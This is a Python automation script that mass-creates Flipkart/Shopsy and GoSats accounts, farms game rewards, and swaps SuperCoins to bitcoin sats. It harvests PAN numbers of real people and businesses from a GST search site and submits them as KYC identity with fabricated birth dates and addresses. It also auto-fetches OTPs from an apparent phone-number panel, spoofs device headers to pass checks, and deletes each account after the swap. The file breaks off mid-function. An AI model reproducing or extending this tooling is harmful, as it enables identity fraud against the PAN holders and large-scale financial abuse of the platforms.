#!/usr/bin/env python3
"""
Flipkart + Gosats Automation – ULTRA FAST (FIXED FLOW)
- Play games FIRST, then Gosats login/swap
- Auto‑signup after deletion
- Gosats onboarding with NEW KYC flow:
  1. Find PAN from GST database
  2. Validate PAN via /v1/user/onboarding/card/ckeckid
  3. Extract user details from validation response
  4. Update KYC with extracted details
- All OTPs auto‑fetched (including min‑KYC)
- Infinite retries for KYC transient errors
- JSON Login support – GLOBAL or PER‑DEVICE (explicitly provided)
- CORRECT swap endpoint: /v1/rewardswap/swap (NO /fk/!)
- CORRECT payload with deviceInfo and float swapINR
- NO session file saving/loading - always OTP login except explicit JSON import
- ELIGIBILITY_DAYS = 90
- Automatic deletion after swap (no user confirmation)
- DELETE OTP: single attempt, 30‑second timeout, 0.5‑second polling, 2s delay before polling
- OTP regex improved to avoid false negatives
"""

import os, sys, json, time, uuid, asyncio, aiohttp, aiohttp.web, requests, re, base64, urllib.parse
from pathlib import Path
from typing import Optional, Dict, List, Any, Tuple
from dataclasses import dataclass, field
from datetime import datetime, timedelta
import shutil
import random
import string

# ------------------- CONFIG -------------------
DATA_DIR = Path("sessions")
DATA_DIR.mkdir(parents=True, exist_ok=True)

DEFAULT_PINCODE = "226001"
FIXED_CONCURRENCY = 10
GAMES = [
    {"id": "runner-3d", "name": "Super Runner", "play_time": 94, "gems": 200},
    {"id": "city-builder", "name": "City Builder", "play_time": 47, "gems": 100},
    {"id": "match-3", "name": "Fruit Crush", "play_time": 35, "gems": 100},
    {"id": "goods-triple", "name": "Grocery Match", "play_time": 40, "gems": 100},
    {"id": "ludo", "name": "Ludo", "play_time": 50, "gems": 100},
    {"id": "nazaria", "name": "Nazar Pop", "play_time": 45, "gems": 100},
]
FAST_PLAY_SEC = 18
ELIGIBILITY_DAYS = 90
OTP_TIMEOUT = 20
MAX_CONCURRENT = 20
MAX_DEVICES_FETCH = 100
MAX_OTP_RETRIES = 2

GOSATS_BASE = "https://api.gosats.io"
GOSATS_OTP_TIMEOUT = 20
MASTERSINDIA_BASE = "https://blog-backend.mastersindia.co"

# ------------------- DEVICE INFO (HAR format - CRITICAL for E1001 fix) -------------------
DEVICE_INFO = {
    "device": {
        "platform": "android",
        "osVersion": 35,
        "deviceId": "b829a6f194254e55",
        "deviceName": "SM-A536E",
        "brand": "Samsung",
        "model": "SM-A536E",
        "memory": 3136536576,
        "macAddress": "",
        "manufacturer": "Samsung",
        "ipAddress": "10.0.2.15",
        "referer": "",
        "versionCode": "3.1.0"
    },
    "advertisingId": "3e0d3f64-3657-40af-9095-c0f4fc692d8e"
}

# Headers matching real GoSats app (from HAR)
GOSATS_HEADERS_CORRECT = {
    "accept": "application/json",
    "content-type": "application/json",
    "accept-encoding": "gzip, deflate, br",
    "user-agent": "NitroFetch/1.0",
    "x-on-prod": "yes",
    "x-m-app-version": "3.1.0",
    "x-device-id": "b829a6f194254e55",
    "x-device-os": "android",
    "x-device-os-version": "35",
    "x-device-ip": "10.0.2.15",
    "x-device-mac": "",
    "x-device-manufacturer": "Samsung",
    "x-device-memory": "3136536576",
    "x-device-brand": "Samsung",
    "x-device-model": "SM-A536E",
    "x-device-name": "SM-A536E",
    "x-bundle-id": "io.gosats",
}

# ------------------- LOGGING -------------------
class Logger:
    def __init__(self, debug=False): self.debug = debug
    def info(self, msg): print(f"[+] {msg}", flush=True)
    def ok(self, msg): print(f"[✓] {msg}", flush=True)
    def warn(self, msg): print(f"[!] {msg}", flush=True)
    def error(self, msg): print(f"[-] {msg}", flush=True)

log = Logger()

# ------------------- SESSION CLEANER -------------------
def clear_all_sessions():
    if DATA_DIR.exists():
        shutil.rmtree(DATA_DIR)
        DATA_DIR.mkdir(parents=True, exist_ok=True)
        log.ok("All session files cleared.")
    else:
        DATA_DIR.mkdir(parents=True, exist_ok=True)

# ===================== GOSATS + MASTERSINDIA HELPERS =====================

INDIAN_NAMES = [
    "abhishek", "aditya", "ajay", "akhilesh", "alok", "amitabh", "amitesh", "anand", "aniket", "animesh",
    "anirudh", "anupam", "arjun", "arnav", "arpit", "aryan", "ashish", "ashutosh", "atul", "avinash",
    "ayush", "basant", "bharat", "bhavin", "bhavesh", "bhoopesh", "bipin", "brajesh", "chaitanya", "chaman",
    "chandan", "chandra", "chetan", "darshan", "deep", "deependra", "dev", "devendra", "dharmendra", "dhruv",
    "digvijay", "dinesh", "diwakar", "gagan", "ganesh", "gaurav", "girish", "gopal", "govind", "gulshan",
    "gunjan", "gyan", "harendra", "hari", "harish", "heet", "hemant", "himanshu", "hitesh", "hrithik",
    "imran", "indresh", "irfan", "ishaan", "jai", "jay", "jayant", "jeevan", "jiten", "jyoti",
    "kailash", "kalpesh", "kamal", "karan", "kartik", "kaushal", "keval", "kiran", "kishan", "kishore",
    "krish", "krishna", "kunal", "kushal", "lalit", "lakshay", "lokesh", "madan", "madhav", "mahavir",
    "mahendra", "mahesh", "manav", "manish", "manoj", "manvendra", "mayank", "mihir", "milan", "milind",
    "mitesh", "mohan", "mukesh", "mukul", "narendra", "narayan", "naveen", "navin", "neeraj", "nikhil",
    "nilesh", "niraj", "nirmal", "nishant", "nitesh", "om", "omkar", "pankaj", "parag", "paras",
    "parth", "pawan", "prakash", "pranav", "prasanna", "prateek", "pratik", "prayag", "prem", "priyansh",
    "puneet", "pushkar", "raghav", "raghu", "rajan", "rajat", "rajesh", "rajiv", "rajkumar", "rajnish",
    "ram", "ramesh", "ranjeet", "ranvir", "rathin", "ravindra", "ravish", "riyaan", "rohan", "rohit",
    "romil", "ronak", "rudra", "sachin", "sahil", "sai", "samir", "sandeep", "sandip", "sanjay",
    "sanjiv", "santosh", "saran", "sarvesh", "satyam", "saurabh", "shailendra", "shakti", "shashank", "shemar",
    "shiv", "shiva", "shubham", "shyam", "siddharth", "sikandar", "soham", "somnath", "sourav", "sriram",
    "subhash", "sudhir", "sujay", "sukhdev", "sumeet", "sundar", "sunit", "sunny", "suraj", "surya",
    "sushant", "sushil", "tapan", "tarun", "tejas", "uday", "udit", "ujjwal", "umang", "umesh",
    "upendra", "uttam", "vansh", "varun", "vasu", "vikas", "vikram", "vimal", "vipin", "vipul",
    "viraj", "vishal", "vishnu", "vivek", "vraj", "yash", "yogendra", "yogesh", "yuvraj",
]

CITIES = ["LUCKNOW", "NOIDA", "DELHI", "JAIPUR", "MUMBAI", "PATNA", "BANGALORE", "HYDERABAD", "CHENNAI", "KOLKATA", 
          "PUNE", "AHMEDABAD", "SURAT", "VADODARA", "NAGPUR", "BHOPAL", "INDORE", "RAIPUR", "RANCHI", "BHUBANESHWAR"]
STATES = ["UTTAR PRADESH", "DELHI", "RAJASTHAN", "MAHARASHTRA", "BIHAR", "KARNATAKA", "TELANGANA", "TAMIL NADU", 
          "WEST BENGAL", "GUJARAT", "MADHYA PRADESH", "CHHATTISGARH", "JHARKHAND", "ODISHA", "PUNJAB", "HARYANA"]
PINCODES = ["261001", "226001", "201301", "800001", "110001", "302001", "400001", "560001", "500001", "600001",
            "411001", "380001", "395001", "390001", "440001", "462001", "452001", "492001", "834001", "751001"]
STREETS = ["LAGA", "MAIN ROAD", "VILLAGE ROAD", "WARD NO 5", "NEAR TEMPLE", "GALI NO 3", "SECTOR 12", "MG ROAD", 
           "PARK STREET", "LAKE VIEW", "GANDHI NAGAR", "PATEL NAGAR", "RAJENDRA NAGAR", "ASHOK VIHAR", "LAJPAT NAGAR",
           "MODEL TOWN", "JAWAHAR NAGAR", "SHASTRI NAGAR", "MAHAVIR NAGAR", "BHAVANI NAGAR"]

def random_name():
    return random.choice(INDIAN_NAMES)

def random_email():
    chars = string.ascii_lowercase + string.digits
    name = ''.join(random.choices(chars, k=8))
    return f"{name}@gmail.com"

def random_dob():
    year = random.randint(2001, 2006)
    month = random.randint(1, 12)
    day = random.randint(1, 28)
    return f"{year}-{month:02d}-{day:02d}"

def random_address():
    city = random.choice(CITIES)
    state = random.choice(STATES)
    pincode = random.choice(PINCODES)
    street = random.choice(STREETS)
    return {
        "addLineOne": street,
        "addLineTwo": city,
        "pincode": pincode,
        "city": city,
        "state": state,
        "country": "India"
    }

def split_full_name(full_name: str) -> Tuple[str, str]:
    parts = full_name.strip().split()
    if len(parts) == 1:
        return parts[0], ""
    elif len(parts) == 2:
        return parts[0], parts[1]
    else:
        return parts[0], " ".join(parts[1:])

def process_gstin_to_pan(gstin: str) -> str:
    if not gstin or len(gstin) < 5:
        return gstin
    return gstin[2:-3]

def search_mastersindia(name: str) -> Optional[List[Dict]]:
    url = f"{MASTERSINDIA_BASE}/api/v1/custom/search/name_and_pan/"
    params = {"keyword": name.strip()}
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://www.mastersindia.co",
        "Referer": "https://www.mastersindia.co/gst-number-search-by-name-and-pan/",
    }
    try:
        resp = requests.get(url, params=params, headers=headers, timeout=5)
        if resp.status_code != 200:
            return None
        data = resp.json()
        if not data.get("success", False):
            return None
        results = data.get("data", [])
        if not results:
            return []
        return results
    except:
        return None

def get_pan_pool_from_results(results: List[Dict]) -> List[Dict]:
    pan_pool = []
    for record in results:
        gstin = record.get("gstin", "")
        full_name = record.get("lgnm", "")
        if not gstin or not full_name:
            continue
        pan = process_gstin_to_pan(gstin)
        if len(pan) == 10 and pan.isalnum():
            pan_pool.append({
                "full_name": full_name,
                "pan": pan,
                "gstin": gstin
            })
    return pan_pool

# ============================================================
# UPDATED GOSATS HEADERS
# ============================================================
GOSATS_HEADERS = {
    "Host": "api.gosats.io",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Linux; Android 11; moto g power Build/RPMS31.Q1-54-13.3-10) Mobile [Flipkart/com.flipkart.android/3170100/9.8/UltraSDK/101/5.0.1]",
    "Accept": "*/*",
    "Origin": "https://externalapp.gosats.io",
    "X-Requested-With": "com.flipkart.android",
    "Referer": "https://externalapp.gosats.io/",
    "sec-ch-ua": '"Not;A=Brand";v="8", "Chromium";v="150", "Android WebView";v="150"',
    "sec-ch-ua-platform": '"Android"',
    "sec-ch-ua-mobile": "?1",
    "sec-fetch-site": "same-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "accept-encoding": "gzip, deflate, br, zstd",
    "accept-language": "en,en-US;q=0.9",
    "priority": "u=1, i",
}

UPDATED_GOSATS_HEADERS = {
    "accept": "application/json",
    "content-type": "application/json",
    "accept-encoding": "gzip",
    "user-agent": "okhttp/4.12.0",
}

# ===================== GOSATS CLIENT =====================

class GosatsClient:
    def __init__(self):
        self.session = requests.Session()
        self.token = None
        self.user_id = None
        self.logged_in = False
        self.headers = GOSATS_HEADERS.copy()

    def _request(self, method, path, body=None, use_updated=False):
        url = f"{GOSATS_BASE}{path}"
        if use_updated:
            h = UPDATED_GOSATS_HEADERS.copy()
        else:
            h = self.headers.copy()
        
        if self.token:
            h["Authorization"] = f"Bearer {self.token}"
        
        try:
            if method == "GET":
                resp = self.session.get(url, headers=h, timeout=10)
            else:
                resp = self.session.post(url, json=body, headers=h, timeout=10)
            
            if resp.status_code == 200:
                return resp.json()
            return None
        except:
            return None

    def send_otp(self, phone: str) -> bool:
        data = self._request("POST", "/v1/auth/user/signin", {"phoneNumber": phone})
        return data is not None

    def verify_otp(self, phone: str, otp: str) -> Tuple[bool, Optional[dict]]:
        data = self._request("POST", "/v1/auth/user/verify/phone", {"phoneNumber": phone, "code": otp})
        if data and data.get("data", {}).get("AccessToken"):
            self.token = data["data"]["AccessToken"]
            self.logged_in = True
            return True, data.get("data", {})
        if data and data.get("data", {}).get("token"):
            self.token = data["data"]["token"]
            self.logged_in = True
            return True, data.get("data", {})
        return False, None

    def update_state(self, state: str) -> bool:
        data = self._request("POST", "/v1/user/onboarding/card/state/update", 
                             {"cardOnBoardingState": state, "platform": "ultra"})
        return data is not None

    def validate_pan(self, pan: str) -> Optional[Dict]:
        """Validate PAN using the /v1/user/onboarding/card/ckeckid endpoint"""
        body = {
            "id_number": pan,
            "deviceInfo": DEVICE_INFO
        }
        
        data = self._request("POST", "/v1/user/onboarding/card/ckeckid", body, use_updated=True)
        
        if data and not data.get("error"):
            response_data = data.get("data", {})
            if response_data:
                return {
                    "firstName": response_data.get("firstName", ""),
                    "lastName": response_data.get("lastName", ""),
                    "fullName": response_data.get("fullName", ""),
                    "gender": response_data.get("gender", "M")
                }
        return None

    def submit_kyc_extracted(self, user_data: Dict, pan: str, dob: str, email: str) -> Tuple[bool, Optional[str]]:
        """Submit KYC with extracted user data from PAN validation"""
        first_name = user_data.get("firstName", "")
        last_name = user_data.get("lastName", "")
        gender = user_data.get("gender", "M")
        title = "Mr" if gender == "M" else "Ms"
        
        body = {
            "nameTitle": title,
            "firstName": first_name,
            "lastName": last_name,
            "email": email,
            "gender": gender,
            "dob": dob,
            "idType": "PAN",
            "idNumber": pan,
            "isReEditing": False
        }
        
        data = self._request("POST", "/v2/user/kyc/details/update", body, use_updated=True)
        
        if data and not data.get("error"):
            return True, None
        else:
            err = data.get("message", "Unknown error") if data else "No response"
            return False, err

    def update_name(self, name: str, email: str) -> bool:
        data = self._request("POST", "/v1/auth/update/user/details", {"name": name, "email": email, "authType": "fkUltra"})
        return data is not None

    def submit_address(self, address: dict) -> bool:
        perm = address.copy()
        data = self._request("POST", "/v1/user/onboarding/card/update", 
                             {"cardOnBoardingData": {"address": address, "perAddress": perm}})
        return data is not None

    def request_min_kyc_otp(self) -> bool:
        data = self._request("GET", "/v1/cardprg/generate/minkyc/otp")
        return data is not None

    def submit_min_kyc_otp(self, otp: str) -> bool:
        data = self._request("POST", "/v1/cardprg/minkyc/process", {"otp": otp})
        return data is not None

    def activate_supercoins(self) -> bool:
        data = self._request("POST", "/v1/rewardswap/activate")
        return data is not None

    def get_config(self) -> Optional[dict]:
        """Get swap config - uses correct endpoint NO /fk/!"""
        data = self._request("GET", "/v1/rewardswap/config")
        return data

    def get_balance(self) -> int:
        """Get SuperCoin balance"""
        data = self.get_config()
        if data:
            sc = data.get("data", {}).get("swapConfig", {}).get("supercoin", {})
            return sc.get("balance", 0)
        return 0

    def get_swap_rates(self) -> Optional[dict]:
        """Get swap rates for calculation"""
        config = self.get_config()
        if not config:
            return None
        
        swap_cfg = config.get("data", {}).get("swapConfig", {})
        sc = swap_cfg.get("supercoin", {})
        sats_cfg = swap_cfg.get("sats", {})
        
        return {
            "sats_from_factor": sats_cfg.get("fromFactor", 17),
            "sats_to_factor": sats_cfg.get("toFactor", 15),
            "sc_from_factor": sc.get("fromFactor", 1.17647),
            "sc_balance": sc.get("balance", 0),
            "sc_max": sc.get("max", 30),
        }

    def swap_coins(self, amount: int) -> bool:
        """
        Swap SuperCoins to Sats using CORRECT endpoint and payload format.
        Based on test-2.py HAR-based fix.
        
        URL: /v1/rewardswap/swap (NO /fk/!)
        Payload includes deviceInfo (CRITICAL for E1001!)
        swapINR is FLOAT = swapTo.exact / sats.fromFactor
        """
        # Get rates from config
        rates = self.get_swap_rates()
        if not rates:
            log.error("Failed to fetch swap config")
            return False
        
        sats_from_factor = rates["sats_from_factor"]
        sats_to_factor = rates["sats_to_factor"]
        sc_from_factor = rates["sc_from_factor"]
        
        # Calculate swap amounts using REAL formula from HAR
        # SC → Sats: rate = sats_toFactor / SC_fromFactor
        rate = sats_to_factor / sc_from_factor
        sats_exact = amount * rate
        sats_rounded = round(sats_exact)
        
        # swapINR = swapTo.exact / sats_fromFactor (FLOAT!)
        swap_inr = sats_exact / sats_from_factor
        
        log.info(f"🧮 Swap calculation:")
        log.info(f"   Rate: {sats_to_factor} / {sc_from_factor} = {rate:.4f}")
        log.info(f"   swapTo.exact: {amount} * {rate:.4f} = {sats_exact}")
        log.info(f"   swapTo.rounded: {sats_rounded}")
        log.info(f"   swapINR: {sats_exact} / {sats_from_factor} = {swap_inr}")
        
        # Build payload (HAR format)
        payload = {
            "swapINR": swap_inr,  # FLOAT, not int!
            "swapFrom": {
                "name": "supercoin",
                "exact": amount,
                "rounded": amount
            },
            "swapTo": {
                "name": "sats",
                "exact": sats_exact,
                "rounded": sats_rounded
            },
            "deviceInfo": DEVICE_INFO  # CRITICAL! Was causing E1001!
        }
        
        log.info(f"📦 Swap Payload: {json.dumps(payload, indent=2)}")
        
        # Execute swap - NO /fk/! endpoint
        data = self._request("POST", "/v1/rewardswap/swap", payload, use_updated=True)
        
        if data:
            if not data.get("error"):
                log.ok(f"✅ Swap successful: {amount} SC → {sats_rounded} Sats")
                return True
            else:
                ec = data.get("errorCode", "?")
                em = data.get("message", "?")
                log.error(f"❌ Swap failed: [{ec}] {em}")
                if ec == "E1001":
                    log.error("   E1001: DeviceInfo mismatch or token issue")
                return False
        
        return False

# ------------------- ONBOARDING WITH UPDATED KYC FLOW -------------------
async def gosats_onboarding_full(phone: str, token: str, panel: dict, device: str, client) -> Tuple[bool, int]:
    """
    Full onboarding for new GoSats account with updated KYC flow:
    1. Find PAN from GST database
    2. Validate PAN via /v1/user/onboarding/card/ckeckid
    3. Extract user details from validation response
    4. Update KYC with extracted details
    """
    log.info(f"🚀 Starting full GoSats onboarding for {phone}")
    g = GosatsClient()
    g.token = token
    g.logged_in = True

    # Update states
    for state in ["INTRO_ANIMATION_VIEWED", "CONSENT_GIVEN"]:
        if not g.update_state(state):
            log.warn(f"State {state} update failed")
    if not g.update_state("DETAILS_CONFIRMED"):
        log.error("State DETAILS_CONFIRMED failed")
        return False, 0

    email = random_email()
    success = False
    successful_pan = None
    successful_name = None
    selected_dob = None
    kyc_user_data = None
    pan_attempts = 0
    used_names = set()

    log.info(f"Searching for valid PAN...")

    while not success:
        pan_attempts += 1
        
        # Find PAN from MastersIndia
        search_name = random_name()
        while search_name in used_names:
            search_name = random_name()
        used_names.add(search_name)
        
        log.info(f"Attempt {pan_attempts}: Searching for '{search_name}'")
        
        results = search_mastersindia(search_name)
        if not results:
            await asyncio.sleep(0.1)
            continue
        
        pan_pool = get_pan_pool_from_results(results)
        if not pan_pool:
            await asyncio.sleep(0.1)
            continue
        
        random.shuffle(pan_pool)
        log.info(f"Found {len(pan_pool)} PAN(s) for '{search_name}'")
        
        for entry in pan_pool:
            full_name = entry["full_name"]
            pan = entry["pan"]
            dob = random_dob()
            
            log.info(f"Testing PAN: {pan} ({full_name})")
            
            # STEP 1: Validate PAN with GoSats API
            user_data = await asyncio.to_thread(g.validate_pan, pan)
            
            if not user_data:
                log.warn(f"PAN {pan} validation failed")
                continue
            
            log.info(f"PAN validated! Name: {user_data.get('fullName', 'Unknown')}")
            
            # STEP 2: Update KYC with extracted details
            ok, err = await asyncio.to_thread(g.submit_kyc_extracted, user_data, pan, dob, email)
            
            if ok:
                log.ok(f"KYC successful with PAN: {pan}")
                successful_pan = pan
                successful_name = user_data.get("fullName", full_name)
                selected_dob = dob
                kyc_user_data = user_data
                success = True
                break
            else:
                if "already used" in err.lower() or "duplicate" in err.lower():
                    log.warn(f"PAN {pan} already used, skipping")
                else:
                    log.warn(f"KYC failed for {pan}: {err}")
                continue
        
        if not success:
            log.info(f"All PANs in batch failed, trying next batch...")
            await asyncio.sleep(0.1)

    if not success:
        log.error("No valid PAN found after multiple attempts")
        return False, 0

    # Update state to PAN_DETAILS_ENTERED
    if not g.update_state("PAN_DETAILS_ENTERED"):
        log.warn("State PAN_DETAILS_ENTERED update failed")

    # Update name
    if not g.update_name(successful_name, email):
        log.warn("Name update failed")

    # Address
    address = random_address()
    if not g.submit_address(address):
        log.warn("Address submission failed")

    # Request min-KYC OTP
    if not g.request_min_kyc_otp():
        log.error("Min-KYC OTP generation failed")
        return False, 0

    # Auto‑fetch min‑KYC OTP from panel
    log.info("⏳ Auto‑fetching Min-KYC OTP from panel...")
    min_otp = await client.poll_otp_from_panel(panel["url"], device, "GOSATS", timeout=GOSATS_OTP_TIMEOUT)
    if not min_otp:
        log.error("Min-KYC OTP not received from panel")
        return False, 0

    if not g.submit_min_kyc_otp(min_otp):
        log.error("Min-KYC OTP submission failed")
        return False, 0

    # Update KYC_AUTH_DONE
    if not g.update_state("KYC_AUTH_DONE"):
        log.warn("State KYC_AUTH_DONE update failed")

    # Activate SuperCoins - uses correct /v1/rewardswap/activate (NO /fk/!)
    if not g.activate_supercoins():
        log.error("SuperCoins activation failed")
        # continue anyway

    # Get balance using correct config endpoint
    balance = g.get_balance()
    log.ok(f"Onboarding complete! Balance: {balance} SC")
    return True, balance

# ===================== SHOPSY CLIENT (Flipkart) =====================

ROME_TEMPLATE = "https://{dc}.rome.api.flipkart.net"
APP_VERSION = "2291175"
DEVICE_MODEL = "Pixel 9a"
DEVICE_BRAND = "Google"

@dataclass
class ShopsySession:
    device_id: str = field(default_factory=lambda: uuid.uuid4().hex)
    visit_id: str = field(default_factory=lambda: f"{uuid.uuid4().hex}-{int(time.time() * 1000)}")
    dc_id: str = "1"
    at: str = ""
    sn: str = ""
    vid: str = ""
    secure_token: str = ""
    secure_cookie: str = ""
    account_id: str = ""
    user_name: str = ""
    is_logged_in: bool = False
    phone: str = ""
    email: str = ""

class AsyncShopsyClient:
    def __init__(self, log: Logger = None, fast: bool = True):
        self.log = log or Logger()
        self.fast = fast
        self.ctx = ShopsySession()
        self._session: Optional[aiohttp.ClientSession] = None
        self._user_cache = None
        self.base_url = ROME_TEMPLATE.format(dc=self.ctx.dc_id)
        self.emit_callback = None

    def set_emit_callback(self, cb):
        self.emit_callback = cb

    async def emit(self, status: str, data: dict = None):
        if self.emit_callback:
            await self.emit_callback({"status": status, "data": data})

    async def __aenter__(self):
        connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, ttl_dns_cache=300, enable_cleanup_closed=True)
        self._session = aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=30))
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self._session:
            await self._session.close()

    def _sync_urls(self):
        self.base_url = ROME_TEMPLATE.format(dc=self.ctx.dc_id)

    def _url(self, path: str) -> str:
        return f"{self.base_url}{path}"

    @property
    def x_user_agent(self) -> str:
        return f"Mozilla/5.0 (Linux; Android 15; {DEVICE_MODEL} Build/BD4A.250505.003) FKUA/Retail/{APP_VERSION}/Android/Mobile ({DEVICE_BRAND}/{DEVICE_MODEL}/{self.ctx.device_id})"

    def _partner_headers(self, layout: bool = False) -> dict:
        headers = {
            "User-Agent": "okhttp/4.9.2",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip",
            "X-PARTNER-CONTEXT": '{"source":"reseller"}',
            "FK-TENANT-ID": "SHOPSY",
            "business": "reseller",
            "X-User-Agent": self.x_user_agent,
            "X-Visit-Id": self.ctx.visit_id,
            "X-NewRelic-ID": "VwEHU1dSCxABUVlaAAQHU1UA",
        }
        if layout:
            headers["X-Layout-Version"] = '{"appVersion":"910000","frameworkVersion":"1.0"}'
        if self.ctx.at: headers["at"] = self.ctx.at
        if self.ctx.sn: headers["sn"] = self.ctx.sn
        if self.ctx.secure_token: headers["secureToken"] = self.ctx.secure_token
        if self.ctx.secure_cookie: headers["secureCookie"] = self.ctx.secure_cookie
        return headers

    def _game_headers(self) -> dict:
        return {
            "User-Agent": "okhttp/4.9.2",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip",
            "x-user-agent": self.x_user_agent,
            "sessionid": "session_id",
            "X-NewRelic-ID": "VwEHU1dSCxABUVlaAAQHU1UA",
        }

    def _extract_dc_id(self, data: dict, http_status: int) -> Optional[str]:
        is_dc = http_status == 406 or data.get("STATUS_CODE") == 406
        if not is_dc: return None
        if data.get("ERROR_MESSAGE") != "DC Change" and data.get("ERROR_CODE") != 2000: return None
        dc_info = (data.get("META_INFO") or {}).get("dcInfo") or data.get("RESPONSE") or {}
        return str(dc_info.get("id")) if dc_info.get("id") else None

    def _capture_secure_cookie(self, response: aiohttp.ClientResponse) -> None:
        secure_cookie = response.headers.get("securecookie") or response.headers.get("secureCookie")
        if secure_cookie: self.ctx.secure_cookie = secure_cookie

    def _apply_session(self, data):
        session = data.get("SESSION") or {}
        if not session: return
        self.ctx.at = session.get("at") or self.ctx.at
        self.ctx.sn = session.get("sn") or self.ctx.sn
        self.ctx.vid = session.get("vid") or self.ctx.vid
        self.ctx.secure_token = session.get("secureToken") or self.ctx.secure_token
        self.ctx.account_id = session.get("accountId") or self.ctx.account_id
        self.ctx.is_logged_in = bool(session.get("isLoggedIn"))
        if session.get("firstName"):
            last = session.get("lastName") or ""
            self.ctx.user_name = f"{session['firstName']} {last}".strip()

    async def _post_json(self, url: str, payload: dict, *, game: bool = False, layout: bool = False) -> dict:
        path = self._url(url) if url.startswith("/") else self._url("/" + url.lstrip("/"))
        for attempt in range(8):
            headers = self._game_headers() if game else self._partner_headers(layout=layout)
            try:
                async with self._session.post(path, json=payload, headers=headers) as response:
                    self._capture_secure_cookie(response)
                    data = await response.json()
                    dc_id = self._extract_dc_id(data, response.status)
                    if dc_id:
                        self.ctx.dc_id = dc_id
                        self._sync_urls()
                        log.warn(f"DC Change: switching to DC {dc_id}")
                        await asyncio.sleep(0.5)
                        path = self._url(url) if url.startswith("/") else self._url("/" + url.lstrip("/"))
                        continue
                    if not game: self._apply_session(data)
                    if response.status >= 400 or (data.get("STATUS_CODE") or 200) >= 400:
                        raise RuntimeError(f"HTTP {response.status}: {data.get('ERROR_MESSAGE') or data}")
                    return data
            except aiohttp.ClientError as e:
                if attempt == 7: raise RuntimeError(f"Request failed after 8 attempts: {e}")
                await asyncio.sleep(0.5 * (attempt + 1))
        raise RuntimeError("Max retry attempts exceeded")

    # ============================================================
    # JSON LOGIN - IMPORT SESSION DIRECTLY (ONLY when explicitly provided)
    # ============================================================
    def import_session(self, tokens: dict) -> bool:
        try:
            self.ctx.at = tokens.get('at', '')
            self.ctx.sn = tokens.get('sn', '')
            self.ctx.secure_token = tokens.get('secureToken', '')
            self.ctx.secure_cookie = tokens.get('secureCookie', '')
            self.ctx.vid = tokens.get('vid', '')
            self.ctx.account_id = tokens.get('accountId', '')
            self.ctx.device_id = tokens.get('device_id', uuid.uuid4().hex)
            self.ctx.visit_id = tokens.get('visit_id', f"{uuid.uuid4().hex}-{int(time.time() * 1000)}")
            self.ctx.dc_id = tokens.get('dc_id', '1')
            self.ctx.user_name = tokens.get('userName', 'User')
            self.ctx.phone = tokens.get('phone', '')
            self.ctx.email = tokens.get('email', '')
            self.ctx.is_logged_in = True
            self._sync_urls()
            log.ok(f"Session imported: {self.ctx.account_id}")
            return True
        except Exception as e:
            log.error(f"Session import failed: {e}")
            return False

    def export_session(self) -> dict:
        return {
            'at': self.ctx.at,
            'sn': self.ctx.sn,
            'secureToken': self.ctx.secure_token,
            'secureCookie': self.ctx.secure_cookie,
            'vid': self.ctx.vid,
            'accountId': self.ctx.account_id,
            'device_id': self.ctx.device_id,
            'visit_id': self.ctx.visit_id,
            'dc_id': self.ctx.dc_id,
            'userName': self.ctx.user_name,
            'phone': self.ctx.phone,
            'email': self.ctx.email,
        }

    # ============================================================
    # OTP LOGIN
    # ============================================================
    async def bootstrap(self) -> None:
        await self.emit("bootstrap_start")
        log.info(f"Bootstrap (DC {self.ctx.dc_id})...")
        payload = {
            "pageUri": "/shopsy2-login-page-store",
            "pageContext": {
                "pageHashKey": None,
                "slotContextMap": None,
                "paginationContextMap": None,
                "stateInfoMap": None,
                "slotIdInfoMap": None,
                "paginatedFetch": False,
                "pageNumber": 1,
                "fetchAllPages": False,
                "networkSpeed": 3000,
                "trackingContext": None,
                "fetchSeoData": False,
            },
            "partnerContext": None,
            "locationContext": {"pincode": DEFAULT_PINCODE},
            "requestContext": None,
        }
        await self._post_json("/4/page/fetch", payload, layout=True)
        await self.emit("bootstrap_done", {"dc": self.ctx.dc_id})
        log.ok(f"Bootstrap OK | dc={self.ctx.dc_id}")

    async def send_otp(self, phone: str) -> str:
        phone = phone.strip().replace("+91", "").replace(" ", "")
        await self.emit("otp_sending", {"phone": phone})
        log.info(f"Sending OTP to +91{phone}")
        payload = {
            "actionRequestContext": {
                "type": "LOGIN_IDENTITY_VERIFY_SHOPSY2",
                "loginId": phone,
                "loginIdPrefix": "+91",
                "phoneNumberFormat": "E164",
                "addAppHash": True,
                "loginType": "MOBILE",
                "verificationType": "OTP",
                "sourceContext": "DEFAULT",
                "clientQueryParamMap": None,
            }
        }
        data = await self._post_json("/1/action/view", payload)
        response_ctx = data.get("RESPONSE", {}).get("actionResponseContext", {})
        if not data.get("RESPONSE", {}).get("actionSuccess"):
            raise RuntimeError(f"OTP send failed: {data}")
        request_id = response_ctx.get("requestId")
        if not request_id:
            remaining = response_ctx.get("remainingAttempts")
            if remaining == 0:
                raise RuntimeError("OTP limit reached (remainingAttempts=0)")
            raise RuntimeError(f"OTP requestId not found: {response_ctx}")
        self.ctx.phone = phone
        await self.emit("otp_sent", {"request_id": request_id[:12]})
        log.ok(f"OTP sent | requestId={request_id[:12]}...")
        return request_id

    async def verify_otp(self, phone: str, otp: str, otp_request_id: str, signup: bool = False) -> bool:
        phone = phone.strip().replace("+91", "").replace(" ", "")
        action_type = "SIGNUP" if signup else "LOGIN_SHOPSY2"
        await self.emit("otp_verifying" if not signup else "signup_verifying")
        log.info(f"{'Signup' if signup else 'Login'} verifying OTP...")
        payload = {
            "actionRequestContext": {
                "type": action_type,
                "loginId": phone,
                "loginIdPrefix": "+91",
                "password": None,
                "otp": otp.strip(),
                "otpRequestId": otp_request_id,
                "remainingAttempts": 5,
                "phoneNumberFormat": "E164",
                "loginType": "MOBILE",
                "verificationType": "OTP",
                "sourceContext": "DEFAULT",
                "churned": False,
                "otpRegex": None,
                "data": None,
                "clientQueryParamMap": None,
            }
        }
        data = await self._post_json("/1/action/view", payload)
